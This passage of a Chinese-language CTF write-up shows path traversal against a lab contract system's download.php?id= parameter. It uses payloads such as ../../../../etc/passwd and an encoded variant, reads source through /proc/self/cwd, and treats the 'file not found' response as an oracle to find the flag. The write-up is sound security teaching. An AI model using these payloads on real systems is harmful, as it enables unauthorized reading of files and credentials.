## 第三阶段：按提示找「临时开放」的审批接口（失败）

这是最自然的第一步，也是最浪费时间的一步。按注释猜了一批：

```
api/approve.php   api/contracts.php   api/list.php    api/contract.php
api/approve       api/contracts       api/list        api/admin.php
api/status.php    approve.php         api/upload.php  api/download.php
api/index.php
```

**全部 404（274 字节的 Apache 错误页）。**

同时观察到：`/api/` 目录本身返回 **403**（目录存在、禁止列表），`/admin.php` 404，`upload.php` 302（未登录跳走）。

### 这一段的判据与结论

- `/api/` 是 403 不是 404 → 目录存在，但文件名没猜中。
- 所有 `.php` 猜测都是 404 → 继续猜下去收益为零，应该换方向。
- **`/api/` 的 403 不等于「里面一定有漏洞」，它只证明目录存在。** 注释里的「审批接口」可能是干扰项，也可能是需要登录后才能访问的端点。

后来没有再回到这一支：因为工作台上还有两个**已经可用**的参数（`upload.php` 和 `download.php?id=`），先测能用的比猜没见过的便宜。

## 第四阶段：下载参数

下载链接：

```html
<a href="/download.php?id=CONTRACT-2024-001.pdf">下载</a>
```

先用正常 ID 请求，确认功能：

```bash
curl -b cj -D h.txt -o f.bin "http://$T/download.php?id=CONTRACT-2024-001.pdf"
# 200，266 字节，file 识别为 UTF-8 text（不是真的 PDF）
```

`download.php` 的源码头部（通过 `/proc/self/cwd/download.php` 读到）写着：

```php
/**
 * 合同下载功能
 * 注意：此功能用于下载已上传的合同文件
 * 文件存储在 /var/www/html/contracts/ 目录下
 */
require_once __DIR__ . '/includes/auth.php';
require_login();
$file_id = isset($_GET['id']) ? $_GET['id'] : '';
```

看到「参数直接拼路径 + 没有 basename/白名单」，路径穿越就是第一个要测的东西。

### 三种写法的对照

| 输入 | HTTP | 大小 | 结果 |
| --- | --- | --- | --- |
| `../../../../etc/passwd` | 200 | 922 | 返回 passwd |
| `/etc/passwd` | 404 | 24 | 绝对路径被拒（可能是 Apache 层） |
| `..%2f..%2f..%2f..%2fetc%2fpasswd` | 200 | 922 | 返回 passwd |
| `../contracts/CONTRACT-2024-001.pdf` | 200 | 266 | 与正常下载一致，确认基准路径 |

**一次请求就确认了穿越。** 不需要编码，不需要双写。

## 第五阶段：找 flag（用「文件不存在」当 oracle）

知道能读任意文件后，问题是 flag 在哪。试了一批常见位置：

| 路径 | 响应 |
| --- | --- |
| `../../../../flag` | `错误：文件不存在` |
| `../../../../flag.txt` | `错误：文件不存在` |
| `../../../../challenge/flag` | `错误：文件不存在` |
| `../../../../challenge/flag.txt` | **flag{5a7f643a-...}** |
| `../../../../challenge/flag1.txt` | `错误：文件不存在` |

这里有个有用的观察：**响应有三种形态**。

1. `200 + 文件内容`：文件存在且可读。
2. `200 + 「错误：文件不存在」`：应用层 `file_exists` 判定失败——说明请求**穿过了所有过滤**，只是路径不存在。
3. `404 + Apache 错误页`：Web 服务器层就拒绝了（绝对路径）。

第 2 种和第 3 种的区别很重要：它把「被过滤」和「文件不存在」分开了，等于一个**免费的目录/文件存在性 oracle**。所以我不用猜层数，直接从 `../../../../challenge/flag.txt` 开始逐个试。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `/api/approve.php` 等 13 个端点 | 全 404 | 274 字节 Apache 错误页；继续猜无收益 |
| `/admin.php` | 404 | 同上 |
| `register.php` | 404 | 无注册入口 |
| `/`、`/index.php`、`/dashboard.php` 未登录 | 302 | 鉴权正常 |
| `upload.php` | 302 | 需要登录，未继续 |
| 绝对路径 `/etc/passwd` | 404 | 服务器层拒绝，改用相对路径 |
| `../contracts/...` | 200 | 确认基址，用于校准层数 |

## 这次真正的收获

1. **注释给的是风险类型，不是端点名。** 按注释猜端点 404 之后，应立刻转向页面上**已经存在**的参数，而不是继续猜目录。
2. **错误形态的差别就是过滤器位置的差别。** 「200 + 应用层错误」和「404 + 服务器错误」分别对应两层检查，前者说明过滤已过。
3. **「文件不存在」可以当 oracle。** 它能区分「路径被拒」和「文件真的没有」，让猜路径变成线性尝试而不是盲目暴力。
4. **`basename()` 缺失优先测四个 `../`。** 看到「参数拼路径」先测穿越，成本一次请求；测通了再去想别的。
